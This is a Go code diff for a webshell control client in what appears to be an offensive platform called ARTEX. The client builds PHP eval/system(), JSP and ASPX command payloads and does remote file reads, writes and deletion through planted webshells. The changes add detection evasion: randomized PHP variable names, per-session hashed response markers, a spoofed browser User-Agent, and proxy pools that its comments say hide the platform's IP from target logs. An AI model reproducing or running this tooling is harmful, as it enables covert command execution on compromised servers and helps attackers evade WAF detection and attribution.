@@ -12,7 +12,8 @@ package server
 // 测试立刻失败。协议约定（详见 webshell_mcp.py 头部注释）：
 //
 //	php      eval 一句话马：命令 base64 → 远端 base64_decode → system() 执行，
-//	         ob_start() 捕获输出 → 回 <<ARTEXMKB>>base64<<ARTEXMKE>> → 客户端剥标记。
+//	         ob_start() 捕获输出 → 回 <<标记>>base64<<标记>> → 客户端剥标记。
+//	         标记按会话参数名派生（webshellMarkers），不含任何工具字样。
 //	php_raw  代码执行马：cmd 直接当 PHP 代码跑（外层同样加标记与 base64 捕获）。
 //	jsp      Runtime.getRuntime().exec(request.getParameter('pass'))
 //	aspx     Process.Start("cmd.exe", "/c " + 参数)
@@ -24,8 +25,11 @@ import (
 	"compress/flate"
 	"context"
 	"crypto/rand"
+	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/binary"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -43,6 +47,7 @@ import (
 	"time"
 
 	"github.com/Autumn-27/artex/config"
+	xproxy "golang.org/x/net/proxy"
 	"golang.org/x/text/encoding/simplifiedchinese"
 )
 
@@ -53,9 +58,6 @@ import (
 const (
 	webshellStoreName = "webshells.json"
 
-	webshellMarkerBegin = "<<ARTEXMKB>>"
-	webshellMarkerEnd   = "<<ARTEXMKE>>"
-
 	webshellChunkDefault    = 512 * 1024
 	webshellChunkMax        = 512 * 1024
 	webshellUploadMax       = 32 * 1024 * 1024
@@ -64,7 +66,13 @@ const (
 	webshellExecOutputLimit = 100 * 1024
 	webshellHTTPBodyLimit   = 16 * 1024 * 1024
 
-	webshellUserAgent = "Mozilla/5.0 (compatible; ARTEX-Webshell-MCP/1.0)"
+	// 默认 UA 用普通浏览器。以前自报 "ARTEX-Webshell-MCP/1.0"，目标侧日志里一眼
+	// 就能看出是谁在打；会话可用 user_agent 覆盖。
+	webshellDefaultUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
+		"(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+
+	// webshellProxyEnv 是全局默认出口代理（会话里的 proxy 优先）。都为空则直连。
+	webshellProxyEnv = "ARTEX_WEBSHELL_PROXY"
 )
 
 var webshellValidTypes = []string{"php", "php_raw", "jsp", "aspx"}
@@ -156,8 +164,17 @@ type webshellSession struct {
 	RemotePath string `json:"remote_path,omitempty"`
 	// Artifacts 是经上传接口写到远端的文件，删会话时一并清理。
 	Artifacts []string `json:"artifacts,omitempty"`
-	CreatedAt string   `json:"created_at"`
-	UpdatedAt string   `json:"updated_at,omitempty"`
+	// Proxy 是这条会话的出口代理：socks5h://user:pass@host:port 或 http://...，
+	// 也接受逗号分隔的池。为空则用 ARTEX_WEBSHELL_PROXY，再为空就直连。
+	// 目的是让目标侧只看到代理/节点 IP，看不到平台地址。
+	Proxy string `json:"proxy,omitempty"`
+	// UserAgent 覆盖默认 UA；为空用普通浏览器 UA（不带任何工具名）。
+	UserAgent string `json:"user_agent,omitempty"`
+	// ProxyRotate 为真时每一次请求都换出口（代理池）。默认否：同一会话固定一个
+	// 出口 IP——出口 IP 本身会变，同一个马老换来源 IP 反而更显眼。
+	ProxyRotate bool   `json:"proxy_rotate,omitempty"`
+	CreatedAt   string `json:"created_at"`
+	UpdatedAt   string `json:"updated_at,omitempty"`
 }
 
 // webshellSessionView 是列表接口的返回项：绝不带 password 与 header 的值。
@@ -169,11 +186,16 @@ type webshellSessionView struct {
 	Note       string   `json:"note"`
 	RemotePath string   `json:"remote_path,omitempty"`
 	Artifacts  []string `json:"artifacts,omitempty"`
-	CreatedAt  string   `json:"created_at"`
-	UpdatedAt  string   `json:"updated_at,omitempty"`
-	ParamSet   bool     `json:"param_set"`   // 是否自定义了参数名
-	HasHeader  bool     `json:"has_header"`  // 是否有自定义 header
-	HeaderKeys []string `json:"header_keys"` // 只有键名，没有值
+	// Proxy 只回打码后的形态（账密换成 ***），前端要能看出「走没走代理、走哪个」
+	Proxy       string   `json:"proxy,omitempty"`
+	Egress      string   `json:"egress,omitempty"` // 实际出口：代理地址或「直连」
+	UserAgent   string   `json:"user_agent,omitempty"`
+	ProxyRotate bool     `json:"proxy_rotate,omitempty"`
+	CreatedAt   string   `json:"created_at"`
+	UpdatedAt   string   `json:"updated_at,omitempty"`
+	ParamSet    bool     `json:"param_set"`   // 是否自定义了参数名
+	HasHeader   bool     `json:"has_header"`  // 是否有自定义 header
+	HeaderKeys  []string `json:"header_keys"` // 只有键名，没有值
 }
 
 // webshellPayloadMeta 是 payload 文件头注释里的 @ 元信息。
@@ -334,20 +356,70 @@ func webshellView(name string, sess webshellSession) webshellSessionView {
 	}
 	sort.Strings(keys)
 	view := webshellSessionView{
-		Name:       name,
-		URL:        webshellRedactURL(sess.URL),
-		Type:       sess.Type,
-		Method:     sess.Method,
-		Note:       sess.Note,
-		RemotePath: sess.RemotePath,
-		Artifacts:  sess.Artifacts,
-		CreatedAt:  sess.CreatedAt,
-		UpdatedAt:  sess.UpdatedAt,
-		ParamSet:   strings.TrimSpace(sess.Password) != "" && strings.TrimSpace(sess.Password) != "pass",
-		HasHeader:  len(keys) > 0,
-		HeaderKeys: keys,
+		Name:        name,
+		URL:         webshellRedactURL(sess.URL),
+		Type:        sess.Type,
+		Method:      sess.Method,
+		Note:        sess.Note,
+		RemotePath:  sess.RemotePath,
+		Artifacts:   sess.Artifacts,
+		Proxy:       webshellRedactProxy(sess.Proxy),
+		Egress:      webshellEgressLabel(sess),
+		UserAgent:   sess.UserAgent,
+		ProxyRotate: sess.ProxyRotate,
+		CreatedAt:   sess.CreatedAt,
+		UpdatedAt:   sess.UpdatedAt,
+		ParamSet:    strings.TrimSpace(sess.Password) != "" && strings.TrimSpace(sess.Password) != "pass",
+		HasHeader:   len(keys) > 0,
+		HeaderKeys:  keys,
 	}
 	return view
+}
+
+// webshellRedactProxy 把出口代理里的账密打码（代理链常有 username:password）。
+func webshellRedactProxy(raw string) string {
+	if strings.TrimSpace(raw) == "" {
+		return ""
+	}
+	parts := webshellProxyPool(raw)
+	out := make([]string, 0, len(parts))
+	for _, p := range parts {
+		u, err := url.Parse(p)
+		if err != nil || u.User == nil {
+			out = append(out, p)
+			continue
+		}
+		u.User = url.UserPassword("***", "***")
+		out = append(out, u.String())
+	}
+	return strings.Join(out, ",")
+}
+
+// webshellEgressLabel 给页面显示当前实际出口：平台代理 / 显式代理 / 直连。
+func webshellEgressLabel(sess webshellSession) string {
+	raw := webshellProxyOf(sess)
+	if raw == "" {
+		if strings.TrimSpace(sess.Proxy) != "" {
+			return "直连（会话强制）"
+		}
+		return "直连（未起平台代理，目标能看到平台 IP）"
+	}
+	pool := webshellProxyPool(raw)
+	label := webshellRedactProxy(webshellPickProxy(raw, strings.TrimSpace(sess.URL), sess.ProxyRotate))
+	if len(pool) > 1 {
+		mode := "本会话固定"
+		if sess.ProxyRotate {
+			mode = "每请求轮换"
+		}
+		label += fmt.Sprintf("（%d 个池，%s）", len(pool), mode)
+	}
+	if strings.TrimSpace(sess.Proxy) == "" {
+		if strings.TrimSpace(os.Getenv("ARTEX_PLATFORM_PROXY")) == "" && raw == proxyEgressURL {
+			return "平台代理（随订阅节点变化）"
+		}
+		return "平台代理 " + label
+	}
+	return label
 }
 
 // webshellRedactURL 把 URL query 里像是「参数名」的键值打码（与 Python 侧一致）。
@@ -536,17 +608,72 @@ func webshellShellQuote(path string) string {
 // 载荷构造（与 Python 侧逐字一致，见 webshell_test.go 的黄金向量）
 // ---------------------------------------------------------------------------
 
+// webshellMarkers 按会话参数名派生回显标记。
+//
+// 以前是固定常量 <<ARTEXMKB>>/<<ARTEXMKE>>：响应一旦被完整记录（WAF 日志、
+// 目标侧 nginx 日志、流量留存），看一眼就知道是哪个工具在打。现在标记随参数名
+// 变、同一会话内稳定、跨会话不同，且不含任何品牌词。
+// 算法与 webshell_mcp.py 的 _markers() 一致：sha256("m:"+参数名) 前 3 字节的 hex。
+func webshellMarkers(sess webshellSession) (string, string) {
+	key := strings.TrimSpace(sess.Password)
+	if key == "" {
+		key = "pass"
+	}
+	sum := sha256.Sum256([]byte("m:" + key))
+	tag := hex.EncodeToString(sum[:3])
+	return "<<" + tag + "b>>", "<<" + tag + "e>>"
+}
+
+// webshellVarRoles 是生成 PHP 代码时各类临时变量用到的角色字母。
+// 与 Python 侧 _php_names() 的键一一对应：cmd/out/path/data/n/size/buf/self/inc/list/res。
+const webshellVarRoles = "copdnsrfglv"
+
+// webshellVarNames 每次生成一段 PHP 代码就取一组一次性变量名。
+//
+// 固定用 $__artex_xxx 等于把工具名写进每个请求的 eval 代码——WAF 把 base64 解
+// 一层就能认出是谁家的工具。现在后缀每次随机，嵌套的两段代码各自随机（26^5
+// 的空间撞不上）。命名规则与 Python 侧一致：$_(5 位小写字母)(角色字母)。
+func webshellVarNames() map[string]string {
+	suf := webshellRandSuffix(5)
+	out := make(map[string]string, len(webshellVarRoles))
+	for i := 0; i < len(webshellVarRoles); i++ {
+		out[webshellVarRoles[i:i+1]] = "$_" + suf + webshellVarRoles[i:i+1]
+	}
+	return out
+}
+
+// webshellRandSuffix 取 n 位随机小写字母（crypto/rand）。
+func webshellRandSuffix(n int) string {
+	const letters = "abcdefghijklmnopqrstuvwxyz"
+	buf := make([]byte, n)
+	if _, err := rand.Read(buf); err != nil {
+		// crypto/rand 失败极罕见；退化成时间派生，宁可指纹弱一点也不中断执行
+		seed := time.Now().UnixNano()
+		for i := range buf {
+			buf[i] = byte(seed >> (uint(i%8) * 8))
+		}
+	}
+	out := make([]byte, n)
+	for i := range buf {
+		out[i] = letters[int(buf[i])%len(letters)]
+	}
+	return string(out)
+}
+
 // webshellPHPCommandPayload：type=php（eval 马），base64 传命令 + system() 执行
 // + ob 捕获 + 标记回传。
-func webshellPHPCommandPayload(cmd string) string {
+func webshellPHPCommandPayload(cmd string, sess webshellSession) string {
 	b := webshellB64Encode([]byte(cmd))
-	return fmt.Sprintf("$__artex_c=base64_decode('%s');"+
-		"ob_start();@system($__artex_c);$__artex_o=ob_get_clean();"+
-		"echo '%s'.base64_encode($__artex_o).'%s';", b, webshellMarkerBegin, webshellMarkerEnd)
+	n := webshellVarNames()
+	mkb, mke := webshellMarkers(sess)
+	return fmt.Sprintf("%s=base64_decode('%s');"+
+		"ob_start();@system(%s);%s=ob_get_clean();"+
+		"echo '%s'.base64_encode(%s).'%s';",
+		n["c"], b, n["c"], n["o"], mkb, n["o"], mke)
 }
 
 // webshellPHPCodePayload：type=php_raw，把 cmd 当 PHP 代码执行。
-func webshellPHPCodePayload(code string) string {
+func webshellPHPCodePayload(code string, sess webshellSession) string {
 	c := strings.TrimSpace(code)
 	if c == "" {
 		return ""
@@ -554,8 +681,10 @@ func webshellPHPCodePayload(code string) string {
 	if !strings.HasSuffix(c, ";") && !strings.HasSuffix(c, "}") {
 		c += ";"
 	}
-	return fmt.Sprintf("ob_start();%s$__artex_o=ob_get_clean();"+
-		"echo '%s'.base64_encode($__artex_o).'%s';", c, webshellMarkerBegin, webshellMarkerEnd)
+	n := webshellVarNames()
+	mkb, mke := webshellMarkers(sess)
+	return fmt.Sprintf("ob_start();%s%s=ob_get_clean();"+
+		"echo '%s'.base64_encode(%s).'%s';", c, n["o"], mkb, n["o"], mke)
 }
 
 // webshellPHPWriteCode：拼 PHP 文件写入代码（外层再包 webshellPHPCodePayload）。
@@ -566,17 +695,21 @@ func webshellPHPWriteCode(remotePath string, data []byte, appendMode bool) strin
 	if appendMode {
 		mode = "FILE_APPEND"
 	}
-	return fmt.Sprintf("$__artex_p=base64_decode('%s');$__artex_d=base64_decode('%s');"+
-		"$__artex_n=@file_put_contents($__artex_p,$__artex_d,%s);"+
-		"echo ($__artex_n===false)?('ERR'):('OK:'.$__artex_n);", p, d, mode)
+	n := webshellVarNames()
+	return fmt.Sprintf("%s=base64_decode('%s');%s=base64_decode('%s');"+
+		"%s=@file_put_contents(%s,%s,%s);"+
+		"echo (%s===false)?('ERR'):('OK:'.%s);",
+		n["p"], p, n["d"], d, n["n"], n["p"], n["d"], mode, n["n"], n["n"])
 }
 
 // webshellPHPReadCode：拼 PHP 文件读取代码，回 'OK|原始大小|base64(内容)'。
 func webshellPHPReadCode(remotePath string, maxBytes int) string {
 	p := webshellB64Encode([]byte(remotePath))
-	return fmt.Sprintf("$__artex_p=base64_decode('%s');$__artex_s=@filesize($__artex_p);"+
-		"$__artex_r=@file_get_contents($__artex_p,false,null,0,%d);"+
-		"echo ($__artex_r===false)?('ERR'):('OK|'.$__artex_s.'|'.base64_encode($__artex_r));", p, maxBytes)
+	n := webshellVarNames()
+	return fmt.Sprintf("%s=base64_decode('%s');%s=@filesize(%s);"+
+		"%s=@file_get_contents(%s,false,null,0,%d);"+
+		"echo (%s===false)?('ERR'):('OK|'.%s.'|'.base64_encode(%s));",
+		n["p"], p, n["s"], n["p"], n["r"], n["p"], maxBytes, n["r"], n["s"], n["r"])
 }
 
 // webshellPowerShellWriteCmd：aspx（Windows）写文件，走 PowerShell 单行命令。
@@ -602,13 +735,14 @@ func webshellPowerShellReadCmd(remotePath string, maxBytes int) string {
 }
 
 // webshellExtractMarked 从响应里抠出标记之间的 base64 并解码。
-func webshellExtractMarked(text string) (string, bool, error) {
-	i := strings.Index(text, webshellMarkerBegin)
+func webshellExtractMarked(text string, sess webshellSession) (string, bool, error) {
+	markerBegin, markerEnd := webshellMarkers(sess)
+	i := strings.Index(text, markerBegin)
 	if i < 0 {
 		return "", false, nil
 	}
-	start := i + len(webshellMarkerBegin)
-	j := strings.Index(text[start:], webshellMarkerEnd)
+	start := i + len(markerBegin)
+	j := strings.Index(text[start:], markerEnd)
 	if j < 0 {
 		return "", false, nil
 	}
@@ -654,6 +788,166 @@ func webshellLooksBlocked(text string) bool {
 // HTTP 层：发一次载荷请求
 // ---------------------------------------------------------------------------
 
+// ---------------------------------------------------------------------------
+// 出口隔离：会话级代理
+//
+// WebShell 的请求以前是平台直连出去的，目标侧 nginx 日志里直接记着平台 IP，
+// 一出事就是「顺着这个 IP 摸回来」。现在每条会话可以配一个出口代理（socks5h /
+// http，可带账密，也可以给一串让每次请求随机挑），没配就看全局环境变量，
+// 都没有才直连（并在页面上明确显示「直连」）。
+// ---------------------------------------------------------------------------
+
+// webshellProxyPool 把「a,b,c」形式的代理池拆成列表（支持逗号/分号/空白分隔）。
+func webshellProxyPool(raw string) []string {
+	fields := strings.FieldsFunc(raw, func(r rune) bool {
+		return r == ',' || r == ';' || r == '\n' || r == '\t' || r == ' '
+	})
+	out := make([]string, 0, len(fields))
+	for _, f := range fields {
+		if f = strings.TrimSpace(f); f != "" {
+			out = append(out, f)
+		}
+	}
+	return out
+}
+
+// webshellProxyOf 取这条会话该用的出口。
+//
+// 默认跟随平台代理：代理订阅里选中的节点由 sing-box 边车暴露在 127.0.0.1:7890，
+// 换节点时出口 IP 自动跟着变，不用改会话配置。边车没起就直连。
+// 会话可以显式指定别的代理（可给一串做池），或填 direct 强制直连。
+func webshellProxyOf(sess webshellSession) string {
+	raw := strings.TrimSpace(sess.Proxy)
+	switch strings.ToLower(raw) {
+	case "direct", "off", "none", "直连":
+		return ""
+	case "":
+		if p := webshellPlatformEgress(); p != "" {
+			return p
+		}
+		// 没有平台代理时，允许部署时用环境变量兜一个
+		return strings.TrimSpace(os.Getenv(webshellProxyEnv))
+	default:
+		return raw
+	}
+}
+
+var (
+	webshellEgressMu  sync.Mutex
+	webshellEgressAt  time.Time
+	webshellEgressVal string
+)
+
+// webshellPlatformEgress 返回平台代理的出口地址；边车没起就返回空（直连）。
+//
+// 用本地端口探测而不是查边车状态：边车进程还在但端口不通时照样发不出请求，
+// 探测比状态更如实。结果缓存几秒，免得每个请求都连一次。
+func webshellPlatformEgress() string {
+	if v := strings.TrimSpace(os.Getenv("ARTEX_PLATFORM_PROXY")); v != "" {
+		switch strings.ToLower(v) {
+		case "off", "direct", "none", "0":
+			return "" // 显式关掉：部署时不希望 WebShell 走平台代理
+		}
+		return v // 部署时想改地址/形态（http 或换端口）走这个
+	}
+	webshellEgressMu.Lock()
+	defer webshellEgressMu.Unlock()
+	if time.Since(webshellEgressAt) < 5*time.Second {
+		return webshellEgressVal
+	}
+	webshellEgressAt = time.Now()
+	webshellEgressVal = ""
+	conn, err := net.DialTimeout("tcp", proxyListenAddr, 300*time.Millisecond)
+	if err == nil {
+		_ = conn.Close()
+		webshellEgressVal = proxyEgressURL
+	}
+	return webshellEgressVal
+}
+
+// webshellPickProxy 从代理池里挑一个。
+//
+// 默认按会话稳定选（同一个马始终同一出口）：出口 IP 本来就会变，而一个马的请求
+// 老是从不同来源 IP 打过来，目标侧反而更容易注意到。只有显式 rotate（会话字段
+// proxy_rotate）才每次随机，用于对冲「单个出口被封」。
+// 挑法用 sha256(sessionKey) 取模，与 Python 侧一致。
+func webshellPickProxy(raw, sessionKey string, rotate bool) string {
+	pool := webshellProxyPool(raw)
+	switch len(pool) {
+	case 0:
+		return ""
+	case 1:
+		return pool[0]
+	}
+	if rotate || strings.TrimSpace(sessionKey) == "" {
+		buf := make([]byte, 1)
+		if _, err := rand.Read(buf); err != nil {
+			return pool[0]
+		}
+		return pool[int(buf[0])%len(pool)]
+	}
+	sum := sha256.Sum256([]byte("p:" + sessionKey))
+	return pool[int(binary.BigEndian.Uint32(sum[:4])%uint32(len(pool)))]
+}
+
+// webshellValidateProxy 校验代理串格式（保存会话时就挡住写错的配置）。
+func webshellValidateProxy(raw string) error {
+	switch strings.ToLower(strings.TrimSpace(raw)) {
+	case "", "direct", "off", "none", "直连":
+		return nil // 留空＝跟随平台代理；direct 等＝强制直连
+	}
+	for _, p := range webshellProxyPool(raw) {
+		u, err := url.Parse(p)
+		if err != nil || u.Host == "" {
+			return fmt.Errorf("出口代理格式不对（%s），应为 socks5h://[user:pass@]host:port 或 http://[user:pass@]host:port", webshellRedactProxy(p))
+		}
+		switch strings.ToLower(u.Scheme) {
+		case "socks5", "socks5h", "http", "https":
+		default:
+			return fmt.Errorf("出口代理协议只支持 socks5 / socks5h / http / https，当前: %s", u.Scheme)
+		}
+	}
+	return nil
+}
+
+// webshellClientFor 按会话的出口配置造一个 http.Client，同时返回本次实际出口描述。
+func webshellClientFor(sess webshellSession, timeout time.Duration) (*http.Client, string, error) {
+	raw := webshellPickProxy(webshellProxyOf(sess), strings.TrimSpace(sess.URL), sess.ProxyRotate)
+	if raw == "" {
+		return &http.Client{Transport: webshellTransport, Timeout: timeout}, "直连", nil
+	}
+	u, err := url.Parse(raw)
+	if err != nil || u.Host == "" {
+		return nil, "", fmt.Errorf("出口代理格式不对（%s）", webshellRedactProxy(raw))
+	}
+	label := webshellRedactProxy(raw)
+	tr := webshellTransport.Clone()
+
+	switch strings.ToLower(u.Scheme) {
+	case "socks5", "socks5h":
+		var auth *xproxy.Auth
+		if u.User != nil {
+			pw, _ := u.User.Password()
+			auth = &xproxy.Auth{User: u.User.Username(), Password: pw}
+		}
+		// 目标域名交给代理解析（socks5h 语义），避免本地 DNS 把查询内容露给运营商
+		d, derr := xproxy.SOCKS5("tcp", u.Host, auth, &net.Dialer{Timeout: 30 * time.Second})
+		if derr != nil {
+			return nil, "", fmt.Errorf("SOCKS5 出口不可用（%s）: %v", label, derr)
+		}
+		tr.Proxy = nil
+		tr.DialContext = func(_ context.Context, network, addr string) (net.Conn, error) {
+			// x/net/proxy 的 Dial 不接 ctx：超时靠 client.Timeout 兜底
+			return d.Dial(network, addr)
+		}
+	case "http", "https":
+		tr.Proxy = http.ProxyURL(u)
+	default:
+		return nil, "", fmt.Errorf("出口代理协议只支持 socks5 / socks5h / http / https，当前: %s", u.Scheme)
+	}
+	return &http.Client{Transport: tr, Timeout: timeout}, label, nil
+}
+
 func webshellPost(ctx context.Context, sess webshellSession, payload string, timeout time.Duration) (int, string, error) {
 	rawURL := strings.TrimSpace(sess.URL)
 	if rawURL == "" {
@@ -689,7 +983,11 @@ func webshellPost(ctx context.Context, sess webshellSession, payload string, tim
 	if err != nil {
 		return 0, "", fmt.Errorf("请求构造失败（%s）: %v", rawURL, err)
 	}
-	req.Header.Set("User-Agent", webshellUserAgent)
+	ua := strings.TrimSpace(sess.UserAgent)
+	if ua == "" {
+		ua = webshellDefaultUA
+	}
+	req.Header.Set("User-Agent", ua)
 	req.Header.Set("Accept", "*/*")
 	req.Header.Set("Accept-Encoding", "identity") // 不请求压缩，简化解析
 	req.Header.Set("Connection", "close")
@@ -697,7 +995,10 @@ func webshellPost(ctx context.Context, sess webshellSession, payload string, tim
 		req.Header.Set(k, v)
 	}
 
-	client := &http.Client{Transport: webshellTransport, Timeout: timeout}
+	client, _, err := webshellClientFor(sess, timeout)
+	if err != nil {
+		return 0, "", err
+	}
 	resp, err := client.Do(req)
 	if err != nil {
 		var ner net.Error
@@ -752,9 +1053,9 @@ func webshellExecPHP(ctx context.Context, name string, sess webshellSession, cmd
 	haveProbe := false
 
 	if cached != "raw" {
-		payload := webshellPHPCommandPayload(cmd)
+		payload := webshellPHPCommandPayload(cmd, sess)
 		if sess.Type == "php_raw" {
-			payload = webshellPHPCodePayload(cmd)
+			payload = webshellPHPCodePayload(cmd, sess)
 		}
 		if payload == "" {
 			return "", "", errors.New("PHP 代码为空")
@@ -763,7 +1064,7 @@ func webshellExecPHP(ctx context.Context, name string, sess webshellSession, cmd
 		if err != nil {
 			return "", "", err
 		}
-		inner, ok, err := webshellExtractMarked(text)
+		inner, ok, err := webshellExtractMarked(text, sess)
 		if err != nil {
 			return "", "", err
 		}
@@ -825,11 +1126,11 @@ func webshellRunPHPCode(ctx context.Context, name string, sess webshellSession, 
 	if webshellModeOf(name) == "raw" {
 		return "", fmt.Errorf("%w：该会话已判定为「系统执行型」马，无法直接执行 PHP 代码", errWSModeMismatch)
 	}
-	_, text, err := webshellPost(ctx, sess, webshellPHPCodePayload(code), timeout)
+	_, text, err := webshellPost(ctx, sess, webshellPHPCodePayload(code, sess), timeout)
 	if err != nil {
 		return "", err
 	}
-	inner, ok, err := webshellExtractMarked(text)
+	inner, ok, err := webshellExtractMarked(text, sess)
 	if err != nil {
 		return "", err
 	}
@@ -872,18 +1173,22 @@ type webshellPurgeResult struct {
 // 不能用 __FILE__：马是 eval 执行的，__FILE__ 会变成
 // "/var/www/x.php(17) : eval()'d code" 这种伪路径，unlink 会静默失败。
 // SCRIPT_FILENAME / get_included_files()[0] 拿到的才是入口脚本的真实路径。
-const webshellSelfPathCode = "$__artex_s='';" +
-	"if(!empty($_SERVER['SCRIPT_FILENAME'])){$__artex_s=$_SERVER['SCRIPT_FILENAME'];}" +
-	"if($__artex_s===''){$__artex_g=@get_included_files();" +
-	"if(!empty($__artex_g)){$__artex_s=$__artex_g[0];}}" +
-	"if($__artex_s===''){$__artex_s=__FILE__;}" +
-	"$__artex_s=(@realpath($__artex_s) ?: $__artex_s);"
+func webshellSelfPathCode(n map[string]string) string {
+	s, g := n["f"], n["g"]
+	return s + "='';" +
+		"if(!empty($_SERVER['SCRIPT_FILENAME'])){" + s + "=$_SERVER['SCRIPT_FILENAME'];}" +
+		"if(" + s + "===''){" + g + "=@get_included_files();" +
+		"if(!empty(" + g + ")){" + s + "=" + g + "[0];}}" +
+		"if(" + s + "===''){" + s + "=__FILE__;}" +
+		s + "=(@realpath(" + s + ") ?: " + s + ");"
+}
 
 // webshellPHPDelCode 拼 PHP 删除代码：逐个 unlink 并回报 OK / GONE / FAIL。
 // 马自身用 SCRIPT_FILENAME 定位，不接收外部路径，避免误删同站正常文件。
 func webshellPHPDelCode(paths []string, includeSelf bool) string {
+	n := webshellVarNames()
 	var sb strings.Builder
-	sb.WriteString("$__artex_l=[")
+	sb.WriteString(n["l"] + "=[")
 	first := true
 	for _, p := range paths {
 		if strings.TrimSpace(p) == "" {
@@ -897,15 +1202,15 @@ func webshellPHPDelCode(paths []string, includeSelf bool) string {
 	}
 	sb.WriteString("];")
 	if includeSelf {
-		sb.WriteString(webshellSelfPathCode)
-		sb.WriteString("$__artex_l[]=$__artex_s;")
+		sb.WriteString(webshellSelfPathCode(n))
+		sb.WriteString(n["l"] + "[]=" + n["f"] + ";")
 	}
-	sb.WriteString("$__artex_r=[];" +
-		"foreach($__artex_l as $__artex_p){" +
-		"if(!file_exists($__artex_p)){$__artex_r[]='GONE '.$__artex_p;continue;}" +
-		"$__artex_r[]=(@unlink($__artex_p)?'OK ':'FAIL ').$__artex_p;" +
+	sb.WriteString(n["v"] + "=[];" +
+		"foreach(" + n["l"] + " as " + n["p"] + "){" +
+		"if(!file_exists(" + n["p"] + ")){" + n["v"] + "[]='GONE '." + n["p"] + ";continue;}" +
+		n["v"] + "[]=(@unlink(" + n["p"] + ")?'OK ':'FAIL ')." + n["p"] + ";" +
 		"}" +
-		`echo implode("\n",$__artex_r);`)
+		`echo implode("\n",` + n["v"] + `);`)
 	return sb.String()
 }
 
@@ -952,12 +1257,14 @@ func webshellShellDelCmd(paths []string, typ string) string {
 // webshellConfirmSelfGone 删完再打一枪：用一个必然回显的代码载荷试探，
 // 取不到标记才算真没了。不能拿「空响应」当判据——加密马收到不认识的载荷本来就是空响应。
 func webshellConfirmSelfGone(ctx context.Context, name string, sess webshellSession, timeout time.Duration) (bool, string) {
-	probe := webshellPHPCodePayload("echo 'ARTEXALIVE';")
+	// 探针只带一句必然回显的 PHP，内容本身不带任何品牌字样
+	probe := webshellPHPCodePayload("echo 1;", sess)
 	_, text, err := webshellPost(ctx, sess, probe, timeout)
 	if err != nil {
 		return true, "复查请求已失败：" + webshellBrief(err.Error(), 120)
 	}
-	if strings.Contains(text, webshellMarkerBegin) || strings.Contains(text, "ARTEXALIVE") {
+	markerBegin, _ := webshellMarkers(sess)
+	if strings.Contains(text, markerBegin) {
 		return false, "复查仍能打通马并获得回显，文件没删掉"
 	}
 	if webshellLooksBlocked(text) {
@@ -1118,6 +1425,9 @@ func (s *Server) webshellSaveSession(w http.ResponseWriter, r *http.Request) {
 		Header   json.RawMessage `json:"header"`
 		Note     string          `json:"note"`
 		Remote   string          `json:"remote_path"`
+		Proxy    string          `json:"proxy"`
+		UA       string          `json:"user_agent"`
+		Rotate   *bool           `json:"proxy_rotate"`
 	}
 	if err := decode(r, &req); err != nil {
 		writeErr(w, 400, "请求体不是合法 JSON: "+err.Error())
@@ -1203,6 +1513,16 @@ func (s *Server) webshellSaveSession(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 400, fmt.Sprintf("remote_path 应是绝对路径（/var/www/html/s.php 或 C:\\inetpub\\s.aspx），收到: %q", remotePath))
 		return
 	}
+	proxy := strings.TrimSpace(req.Proxy)
+	if err := webshellValidateProxy(proxy); err != nil {
+		writeErr(w, 400, err.Error())
+		return
+	}
+	ua := strings.TrimSpace(req.UA)
+	if len(ua) > 512 {
+		writeErr(w, 400, "user_agent 太长（上限 512 字符）")
+		return
+	}
 	now := time.Now().Format("2006-01-02 15:04:05")
 
 	path := s.webshellStorePath()
@@ -1221,16 +1541,31 @@ func (s *Server) webshellSaveSession(w http.ResponseWriter, r *http.Request) {
 	if remotePath == "" {
 		remotePath = strings.TrimSpace(prev.RemotePath)
 	}
+	// 没填就沿用旧配置：页面改个备注不该把出口代理清掉
+	if proxy == "" {
+		proxy = strings.TrimSpace(prev.Proxy)
+	}
+	if ua == "" {
+		ua = strings.TrimSpace(prev.UserAgent)
+	}
+	// 没传 proxy_rotate 就沿用旧配置（*bool：区分「没传」与「显式 false」）
+	rotate := prev.ProxyRotate
+	if req.Rotate != nil {
+		rotate = *req.Rotate
+	}
 	sess := webshellSession{
-		URL:        rawURL,
-		Type:       typ,
-		Password:   param,
-		Method:     method,
-		Header:     header,
-		Note:       note,
-		RemotePath: remotePath,
-		Artifacts:  prev.Artifacts,
-		CreatedAt:  created,
+		URL:         rawURL,
+		Type:        typ,
+		Password:    param,
+		Method:      method,
+		Header:      header,
+		Note:        note,
+		RemotePath:  remotePath,
+		Artifacts:   prev.Artifacts,
+		Proxy:       proxy,
+		UserAgent:   ua,
+		ProxyRotate: rotate,
+		CreatedAt:   created,
 	}
 	if existed {
 		sess.UpdatedAt = now
